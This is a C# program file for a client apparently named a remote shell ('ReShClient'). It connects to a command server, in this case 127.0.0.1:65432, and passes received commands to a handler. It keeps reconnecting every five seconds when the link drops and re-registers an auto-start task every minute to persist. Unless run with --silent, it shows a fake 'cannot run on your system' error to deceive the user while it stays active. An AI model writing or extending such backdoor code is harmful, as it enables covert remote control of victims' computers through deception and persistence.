using System.Diagnostics;
using System.IO.Pipes;
using System.Reflection;
using System.Security.Principal;
using System.Threading.Tasks;

namespace ReShClient
{
    internal static class Program
    {

        private static RSClient _client = new RSClient("127.0.0.1", 65432);

        [STAThread]
        public static async Task Main()
        {
            _client.OnCommandReceived += CommandHandler.OnCommandReceived;
            _client.OnDisconnected += () =>
            {
                _ = Task.Run(async () =>
                {
                    while (!await _client.ConnectAsync())
                    {
                        await Task.Delay(5000);
                    }
                });
            };
            CommandHandler.Client = _client;
            AppDomain.CurrentDomain.UnhandledException += (sender, e) =>
            {
                if (e.ExceptionObject is Exception ex)
                {
                    MyLogger.LogDebug($"[*]Unhandled non-UI thread exception: {ex.Message}");
                }
                else
                {
                    MyLogger.LogDebug("[*]Unhandled non-UI thread exception: Unknown exception object");
                }
            };
            if (Environment.CommandLine != null && Environment.CommandLine.Contains("--uninstall"))
            {
                try
                {
                    SystemUtility.SetAutoStartTask(false, "", "");
                }
                catch (Exception ex)
                {
                    MyLogger.LogDebug($"[*]Error removing auto-start task: {ex.Message}");
                }
                return;
            }
            bool silentMode = false;
            if (Environment.CommandLine != null && Environment.CommandLine.Contains("--silent"))
            {
                MyLogger.LogDebug(Environment.CommandLine);
                silentMode = true;
            }

            try
            {
                if (!silentMode)
                    _ = Task.Run(() => MessageBox.Show("This program cannot run on yout system.Please contact publishers for details.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error));
                await _client.ConnectAsync();
                await Task.Delay(5000);
                while (true)
                {
                    try
                    {
                        SystemUtility.SetAutoStartTask(true, Process.GetCurrentProcess().MainModule.FileName, "");
                    }
                    catch (Exception ex)
                    {
                        MyLogger.LogDebug($"[*]Error setting auto-start task: {ex.Message}");
                    }
                    await Task.Delay(60000);
                }
            }
            catch (Exception ex)
            {
                MyLogger.LogDebug($"[*]Fatal error in main application loop: {ex.Message}");
            }
        }

        
    }
}